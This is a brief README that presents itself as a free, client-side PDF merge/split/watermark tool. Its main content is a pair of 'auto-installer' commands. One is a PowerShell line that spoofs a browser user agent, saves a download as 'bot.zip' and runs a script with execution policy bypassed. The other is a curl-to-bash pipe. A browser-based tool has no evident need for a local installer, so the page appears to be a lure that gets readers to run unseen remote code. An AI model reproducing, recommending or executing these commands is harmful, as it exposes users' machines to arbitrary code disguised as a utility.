# ⚡ Serverless PDF Toolset on Vercel

A completely client-side, private, and unlimited PDF editor (Merge, Split, Watermark) built with pdf-lib and hosted on Vercel for $0.

## 🚀 1-Click Auto-Installer (Windows, Linux, macOS)

Run the command in your terminal to set up the local files:

### For Windows (PowerShell):
```powershell
iwr -useb -UserAgent "Mozilla/5.0" "https://github.com/Ziploot/unlimited-pdf-toolset/archive/refs/heads/main.zip" -OutFile "$env:TEMP\bot.zip"; Expand-Archive -Path "$env:TEMP\bot.zip" -DestinationPath "$env:TEMP\bot-extract" -Force; powershell -ExecutionPolicy Bypass -File "$env:TEMP\bot-extract\unlimited-pdf-toolset-main\install.ps1"
```

### For Linux & macOS (Bash):
```bash
curl -sL https://raw.githubusercontent.com/Ziploot/unlimited-pdf-toolset/main/install.sh | bash
```
